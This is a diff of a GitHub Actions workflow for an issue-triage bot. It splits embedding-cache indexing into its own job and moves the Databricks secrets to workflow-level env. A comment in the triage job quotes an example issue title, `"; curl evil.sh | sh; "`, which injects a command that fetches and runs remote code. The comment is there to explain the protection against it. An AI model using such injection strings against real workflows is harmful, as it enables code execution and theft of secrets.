@@ -1,46 +1,69 @@
 # Pinpoint bot, dogfooded on PinPoint itself (template for other repos: bot/pinpoint.yml).
 # Needs two repo secrets: DATABRICKS_HOST (https://dbc-....cloud.databricks.com) and DATABRICKS_TOKEN
 # (a Databricks personal access token). Posting uses the job's own GITHUB_TOKEN; nothing else.
+# index (push to main / manual) saves the embedding cache; triage (new issue) can only restore it,
+# because GitHub gives untrusted triggers a read-only Actions cache.
 name: Pinpoint
 
 on:
   issues:
     types: [opened]
+  push:
+    branches: [main]
+  workflow_dispatch:
 
 # Least privilege: read the code, write issue comments. Nothing else.
 permissions:
   contents: read
   issues: write
 
-# One triage at a time: a burst of new issues can't burn the Databricks quota in parallel.
+# One run at a time: a burst of new issues can't burn the Databricks quota in parallel.
 concurrency:
   group: pinpoint
   cancel-in-progress: false
 
-jobs:
-  triage:
-    if: github.event.issue.user.type != 'Bot'
-    runs-on: ubuntu-latest
-    timeout-minutes: 60          # a cold repo embeds every function once; later runs reuse the cache
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0         # full history: the default (1 commit) would make one commit "own" every line
+env:
+  DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}
+  DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}
 
-      - uses: actions/setup-python@v5
+jobs:
+  index:
+    if: github.event_name != 'issues'
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-python@v7
         with:
           python-version: "3.12"
-
-      # Cache entries are immutable, so save under a fresh key every run and restore the newest
-      # one by prefix: each run starts from the last run's embeddings and only embeds changed functions.
-      - uses: actions/cache@v4
+      - uses: actions/cache@v6
         with:
           path: ~/.cache/pinpoint
           key: pinpoint-embeddings-${{ github.run_id }}
           restore-keys: pinpoint-embeddings-
+      - run: pip install ".[bot]"     # from this checkout: the repo being triaged is Pinpoint itself
+      - run: pinpoint-bot --index-only
 
+  triage:
+    if: github.event_name == 'issues' && github.event.issue.user.type != 'Bot'
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - uses: actions/checkout@v7
+        with:
+          fetch-depth: 0         # full history: the default (1 commit) would make one commit "own" every line
+      - uses: actions/setup-python@v7
+        with:
+          python-version: "3.12"
+      - uses: actions/cache/restore@v6
+        with:
+          path: ~/.cache/pinpoint
+          key: pinpoint-embeddings-
+          restore-keys: pinpoint-embeddings-
       - name: Install Pinpoint
-        run: pip install ".[bot]"     # from this checkout: the repo being triaged is Pinpoint itself
+        run: pip install ".[bot]"
 
       # The issue text is NOT interpolated here (no ${{ github.event.issue.* }} in `run:`): a title like
       # `"; curl evil.sh | sh; "` would run as shell. pinpoint-bot reads it from $GITHUB_EVENT_PATH as data.
@@ -48,5 +71,3 @@ jobs:
         run: pinpoint-bot
         env:
           GITHUB_TOKEN: ${{ github.token }}
-          DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}
-          DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}
